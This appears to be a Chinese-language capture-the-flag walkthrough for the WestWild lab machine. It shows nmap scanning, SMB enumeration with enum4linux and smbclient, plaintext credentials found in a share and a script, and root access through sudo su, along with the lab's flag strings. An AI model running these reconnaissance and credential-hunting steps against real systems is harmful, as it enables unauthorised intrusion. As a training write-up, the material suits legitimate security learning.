
> 关键在于nmap扫描时扫描完全，smb服务的利用，提权时查看有多少用户，find命令的利用
## 靶机信息
- 级别:中级

## Recon
### nmap
```shell
nmap -sn 192.168.1.0/24
//IP:192.168.1.151

sudo nmap -sT --min-rate 10000 -p- 192.168.1.151 -oA tcp_scan/ports
//Ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

```shell
sudo nmap -sT -sC -sV -O -p 22,80,139,445 -oA tcp_scan/details 192.168.1.151
//扫描结果显示存在smb服务
```
![[Pasted image 20231012183213.png]]

### enum4linux
```shell
enum4linux 192.168.1.151 //enum4linux是一个smb服务枚举工具
```
![[Pasted image 20231012183742.png]]
![[Pasted image 20231012183834.png]]
```shell
smbclient -t \\remote-server //列出smb服务共享的资源
smbclient //192.168.1.151/wave
```
![[Pasted image 20231012184547.png]]
```shell
get FLAG1.txt
得到flag1 ： Flag1{Welcome_T0_THE-W3ST-W1LD-B0rder}
得到一组凭证:user:wavex
            password:door+open

```

## 提权

```shell
//ssh登录到wavex用户后，看到还有一个aveng用户
//wavex用户不能使用sudo su 等命令 suid提权行不通

//查找可写可执行文件
find / -type f -perm -0777 2>/dev/null
/usr/share/av/westsidesecret/ififoregt.sh //只找到一个文件
//得到另一个凭据
#!/bin/bash 
figlet "if i foregt so this my way"
echo "user:aveng"
echo "password:kaizen+80"
```

![[Pasted image 20231012185454.png]]
```shell
登录aveng用户，sudo -l 看到三个ALL，直接提权就行
sudo su //sudo -l 查看可以用sudo执行什么命令

成功提权
falg2 ： Flag2{Weeeeeeeeeeeellco0o0om_T0_WestWild}
```
![[Pasted image 20231012190104.png]]

![[Pasted image 20231012190255.png]]



